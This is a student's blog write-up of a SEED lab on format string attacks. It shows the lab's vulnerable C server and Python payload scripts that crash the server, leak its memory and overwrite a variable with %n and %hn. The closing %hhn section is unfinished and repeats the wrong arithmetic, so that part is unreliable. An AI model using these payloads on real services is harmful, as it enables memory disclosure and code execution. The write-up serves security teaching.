---
layout: post
title: Format String Attack
excerpt:
description: [code injection]
---

A format string is a string that contains special format specifiers that act as placeholders for data. These format specifiers define how data should be displayed when it is substituted into the string.

In C programming language, functions such as `printf()`, `sprintf()`, `fprintf()`, and `scanf()` can be used with format strings. The issue with format strings arise when programs allow users to provide the entire or part of the contents in a format string and such inputs are not sanitized. Malicious users can use the opportunity to get
the program to run arbitrary code.

The basic idea behind a format string attack is that an attacker can include additional format specifiers in the format string to access data or execute code that they should not have access to. For example, an attacker can use the %x specifier to read values from the stack, or %n to write to arbitrary memory locations.

Exploiting a format string vulnerability can lead to various consequences, such as leaking sensitive information, altering program state, crashing the program, or even executing arbitrary code. The impact of the attack depends on the specific vulnerability and the attacker's objectives.

In this post, I aim to document my findings and observations while performing a SEED lab.

<details>
<summary>Lab Notes</summary>
<div markdown="1">

Address randomization is disabled.
```bash
sudo /sbin/sysctl -w kernel.randomize_va_space=0
```
The server program is compiled such that the stack is executable.
```bash
-z execstack
```
Server details
```
The server hosting the 32-bit vulnerable program is at 10.9.0.5
The server hosting the 64-bit vulnerable program is at 10.9.0.6
The servers listens to port 9090 and invoke the appropriate vulnerable program when it receives a TCP connection.
```
</div></details>

<details>
<summary>The Vulnerable Program</summary>
<div markdown="1">

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>

/* Changing this size will change the layout of the stack.
 * Instructors can change this value each year, so students
 * won't be able to use the solutions from the past.
 * Suggested value: between 10 and 400  */
#ifndef BUF_SIZE
#define BUF_SIZE 100
#endif


#if __x86_64__
  unsigned long target = 0x1122334455667788;
#else
  unsigned int  target = 0x11223344;
#endif 

char *secret = "A secret message\n";

void dummy_function(char *str);

void myprintf(char *msg)
{
#if __x86_64__
    unsigned long int *framep;
    // Save the rbp value into framep
    asm("movq %%rbp, %0" : "=r" (framep));
    printf("Frame Pointer (inside myprintf):      0x%.16lx\n", (unsigned long) framep);
    printf("The target variable's value (before): 0x%.16lx\n", target);
#else
    unsigned int *framep;
    // Save the ebp value into framep
    asm("movl %%ebp, %0" : "=r"(framep));
    printf("Frame Pointer (inside myprintf):      0x%.8x\n", (unsigned int) framep);
    printf("The target variable's value (before): 0x%.8x\n",   target);
#endif

    // This line has a format-string vulnerability
    printf(msg);

#if __x86_64__
    printf("The target variable's value (after):  0x%.16lx\n", target);
#else
    printf("The target variable's value (after):  0x%.8x\n",   target);
#endif

}


int main(int argc, char **argv)
{
    char buf[1500];


#if __x86_64__
    printf("The input buffer's address:    0x%.16lx\n", (unsigned long) buf);
    printf("The secret message's address:  0x%.16lx\n", (unsigned long) secret);
    printf("The target variable's address: 0x%.16lx\n", (unsigned long) &target);
#else
    printf("The input buffer's address:    0x%.8x\n",   (unsigned int)  buf);
    printf("The secret message's address:  0x%.8x\n",   (unsigned int)  secret);
    printf("The target variable's address: 0x%.8x\n",   (unsigned int)  &target);
#endif

    printf("Waiting for user input ......\n"); 
    int length = fread(buf, sizeof(char), 1500, stdin);
    printf("Received %d bytes.\n", length);

    dummy_function(buf);
    printf("(^_^)(^_^)  Returned properly (^_^)(^_^)\n");

    return 1;
}

// This function is used to insert a stack frame between main and myprintf.
// The size of the frame can be adjusted at the compilation time. 
// The function itself does not do anything.
void dummy_function(char *str)
{
    char dummy_buffer[BUF_SIZE];
    memset(dummy_buffer, 0, BUF_SIZE);

    myprintf(str);
}
```
</div></details>

<br>

###  Crashing the Program

This task involves crashing a 32-bit vulnerable program runnning on a remote server. The lab has been designed in such a way that when the vulnerable program runs normally, it prints out some essential values that we would need to practice a format string attack.

So we first send a benign message to the server to get these values.
```bash
echo hello | nc -w5 10.9.0.5 9090
```

**image**

When a program uses format string, the function using the format string takes it values from the stack.

Take for example, a program that uses the below format string:
```c
#include <stdio.h>

int main() {
  char name[] = "John Doe";
  char planet[] = "Earth";
  printf("My name is %s and I am from planet %s", name, planet);
}
```
When the stack is built, the optional arguments (name and planet) are placed right above the format string argument. Based on the number of format specifiers, the program tries to access the memory addresses of these optional arguments. Thus if for any reason the format  specifiers are more than the optional arguments provided, the program will try to read the memory address of an area it has no access to leading to a segmentation fault and crashing the program.

To crash the program, we need to introduce format specifiers so program will try to read the memory address of an area it has no access to leading to a segmentation fault. In this case, one format specifier seems to be enough to crash the program.
```bash
echo %s | nc -w5 10.9.0.5 9090
```

**image**

We can tell that the format program has crashed because it did not print out "Returned properly" and a few smiley faces.

<br>

### Printing Out the Server Program’s Memory

The objective of this task is to get the server to print out some data from its memory. 

#### Stack Data

When we use the "%x" format specifier, it instructs the program to access a memoey location and print out the hex value of the contents in that memory location. For this task we would need to build our input to the server such that when the values in memory are printed, we can tell the offset from the beginning of the stack.

Thus our input will start with a value we know i.e. AAAA = \x41\x41\x41\x41 and will be made up of an increasing number of "%x" until we are able to see the value \x41\x41\x41\x41 printed out.

```python
#!/usr/bin/python3
import sys

# Start input with a content we can easily recognize
content = ("AAAA").encode('latin-1')

# Append format specifiers
content += ("_%x" * 80).encode('latin-1')

# Append a newline
content += ("\n").encode('latin-1')


# Write the content to badfile
with open('badfile', 'wb') as f:
  print(f"writing {len(content)} bytes to badfile...")
  f.write(content)
```

```bash
python3 badfile.py
cat badfile | nc -w2 10.9.0.5 9090
```

**image**

After a number of trial and error, I was able to determine that the offset of our input from the beginning of the stack is 64. Thus, it will take 64 `%x` to  print out the first four bytes of my input.

#### Heap Data

There is a secret message that is stored on the heap when the program runs. We know that the memory address of this secret message on the heap is `0x080b4008`. In order to print out the value stored in this memory address, we will use `0x080b4008` as the first value in our input, pad it with 63 `%x` so that our program will not crash, then print out the secret message with `%s` to complete the offset.

Our initial code will be modified to achieve this
```python
#!/usr/bin/python3
import sys

# Start input with the memory address of secret message
content = (0x080b4008).to_bytes(4,byteorder='little')

# Append format specifiers to prevent the program from crashing
content += ("_%x" * 63).encode('latin-1')

# print out the value stored in 0x080b4008
content += ("_%s").encode('latin-1')

# Append a newline
content += ("\n").encode('latin-1')


# Write the content to badfile
with open('badfile', 'wb') as f:
  print(f"writing {len(content)} bytes to badfile...")
  f.write(content)
```

```bash
python3 badfile.py
cat badfile | nc -w2 10.9.0.5 9090
```

**image**

<br>

### Modifying the Server Program’s Memory

The objective of this task is to modify the value of the target variable that is defined in the server program. If this target variable holds an important value that can affect the control flow of the program; attackers can change the behavior of the program if they can modify this value.
We know that the memory address of the target variable is `0x080e5068`

#### Changing the value to a different value.

This task involves changing the content of the target variable to any value different from the original. The `%n` format specifier writes the number f characters that have been printed by printf() before its occurrence into an meemory address (This memory address corresponds to the corresponding argument for %n%).

Since we know that our offset is 64, will need to write our code in such a way that the program will print out characters up to offset 63, then use `%n%` at offset 64 to modify the value stored in the memory address of the target variable we provided as the start of our input.

```python
#!/usr/bin/python3
import sys

# Start input with the memory address of the target variable
content = (0x080e5068).to_bytes(4,byteorder='little')

# Append format specifiers to prevent the program from crashing
content += ("%x" * 63).encode('latin-1')

# Access 0x080e5068 and overwrite it's content
content += ("%n").encode('latin-1')

# Append a newline
content += ("\n").encode('latin-1')


# Write the content to badfile
with open('badfile', 'wb') as f:
  print(f"writing {len(content)} bytes to badfile...")
  f.write(content)
```

```bash
python3 badfile.py
cat badfile | nc -w2 10.9.0.5 9090
```

**image**

#### Changing the value to 0x5000.

This task involves changing the content of the target variable to a "0x5000" rather than a random variable. This is more tricky than the previous task because we need to print out `0x5000 = 20480` characters. We can use precision modifiers (It pads the didgits with zeros to achieve the desired width) which control the minimum number of digits to print to achieve this. Ususally, multiple format specifiers with different precision modifiers will have to be used.

For this task, I need to determine the total number of characters I would need to print for each precision modifier.
- 0x5000 = 20480
- The offset is 64, and will contain multiple format specifiers:
  - we need one for the %n% format specifier
  - we need one for the modulo number precision modifier for %x
  - we need 64 - 2 for the whole number precision modifier for %x
- The first 4 bytes are where I would store the target variable's address.
  - 20480 - 4 = 20476
- The whole number precision modifier for %x:
  - 20476 // 62 = 330
- The modulo number precision modifier for %x:
  - 20476 % 62 = 16
 
To verify our math, 4 + (330 x 62) + 16 = 20480 = 0x5000

```python
#!/usr/bin/python3
import sys

# Start input with the memory address of the target variable
content = (0x080e5068).to_bytes(4,byteorder='little')

# Append format specifiers to prevent the program from crashing
content += ("%.330x" * 62).encode('latin-1')
content += ("%.16x").encode('latin-1')

# Access 0x080e5068 and overwrite it's content
content += ("%n").encode('latin-1')

# Append a newline
content += ("\n").encode('latin-1')


# Write the content to badfile
with open('badfile', 'wb') as f:
  print(f"writing {len(content)} bytes to badfile...")
  f.write(content)
```

```bash
python3 badfile.py
cat badfile | nc -w2 10.9.0.5 9090
```

**image**

#### Changing the value to 0xAABBCCDD.

This sub-task is similar to the previous one, except
that the target value is now a large number. In a format string attack, this value is the total number of
characters that are printed out by the printf() function; printing out this large number of characters
may take hours. You need to use a faster approach. The basic idea is to use %hn or %hhn, instead of
%n, so we can modify a two-byte (or one-byte) memory space, instead of four bytes. Printing out 2
16
characters does not take much time. More details can be found in the SEED book.

##### Using %hn

While %n treats the argument provided as a 4-byte integer, %hn treats the argument as a 2-byte integer, overwriting the least significant bytes of the argument. We are going to place `0xAABBCCDD` into memory address `0x080e5068` two bytes at a time.

Our program is a 32-bit program so our address is a 4-byte address. Our machine is little-endian, so we break `0xAABBCCDD` into two parts with two bytes each.
- 0x080e5068 => 0xCCDD
- 0x080e506a => 0xAABB

The values written are cummulative, so when constructing our string, we have to start with the addresses that will store lower values.

For this task, I need to determine the total number of characters I would need to print for each precision modifier.
- 0xAABB = 43707
- 0xCCDD = 52445
- The offset is 64, and will contain multiple format specifiers:
  - we need one for the %hn% format specifier for the first address
  - we need one for the %x modulo precision modifier for the first address
  - we need 64 - 2 for the %x whole number precision modifier for the first address
- The string will start with the address that will contain a lower value, appended by 4-bytes of random data to account for the %x specifier that will be used for the second address and finally the address that will contain a higher value. This is a total of 12-bytes.
- The first address will store a lower value which is 0xAABB (43707). The first 12 bytes are where I would store the target variable's addresses.
  - 43707 - 12 = 43695
- The whole number %x precision modifier for the first address is:
  - 43695 // 62 = 704
- The modulo number %x precision modifier for the first address is:
  - 43695 % 62 = 47
- The second address will store a higher value which is 0xCCDD (52445). To determine the number of %x precision modifiers to use, we would subtract 0xAABB form 0xCCCC:
  - 0xCCDD - 0xAABB = 52445 - 43707 = 8738

```python
#!/usr/bin/python3
import sys

# Start input with the memory address that will store a lower value
content = (0x080e506a).to_bytes(4,byteorder='little')

# Append 4-bytes to account for writing to the second memory address
content += ("@@@@").encode('latin-1')

# Append the memory address that will store a higher value
content += (0x080e5068).to_bytes(4,byteorder='little')

# Append format specifiers to prevent the program from crashing, access 0x080e506a and overwrite it's content
content += ("%.704x" * 62).encode('latin-1')
content += ("%.47x%hn").encode('latin-1')

# Append format specifiers to prevent the program from crashing, access 0x080e5068 and overwrite it's content
content += ("%.8738x%hn").encode('latin-1')

# Append a newline
content += ("\n").encode('latin-1')


# Write the content to badfile
with open('badfile', 'wb') as f:
  print(f"writing {len(content)} bytes to badfile...")
  f.write(content)
```

```bash
python3 badfile.py
cat badfile | nc -w2 10.9.0.5 9090
```

**image**


##### Using %hhn

While %n treats the argument provided as a 4-byte integer, %hhn treats the argument as a 1-byte integer, overwriting the least significant byte of the argument. We are going to place `0xAABBCCDD` into memory address `0x080e5068` one byte at a time.

Our program is a 32-bit program so our address is a 4-byte address. Our machine is little-endian, so we break `0xAABBCCDD` into four parts with one byte each.
- 0x080e5068 => 0xDD
- 0x080e5069 => 0xCC
- 0x080e506a => 0xBB
- 0x080e506b => 0xBB

The values written are cummulative, so when constructing our string, we have to start with the addresses that will store lower values.

For this task, I need to determine the total number of characters I would need to print for each precision modifier.
- 0xAA = 170
- 0xBB = 187
- 0xCC = 204
- 0xDD = 221
- The offset is 64, and will contain multiple format specifiers:
  - we need one for the %hn% format specifier for the first address
  - we need one for the %x modulo precision modifier for the first address
  - we need 64 - 2 for the %x whole number precision modifier for the first address
- The string will start with the address that will contain a lower value, appended by 4-bytes of random data to account for the %x specifier that will be used for the second address and finally the address that will contain a higher value. This is a total of 12-bytes.
- The first address will store a lower value which is 0xAABB (43707). The first 12 bytes are where I would store the target variable's addresses.
  - 43707 - 12 = 43695
- The whole number %x precision modifier for the first address is:
  - 43695 // 62 = 704
- The modulo number %x precision modifier for the first address is:
  - 43695 % 62 = 47
- The second address will store a higher value which is 0xCCDD (52445). To determine the number of %x precision modifiers to use, we would subtract 0xAABB form 0xCCCC:
  - 0xCCDD - 0xAABB = 52445 - 43707 = 8738





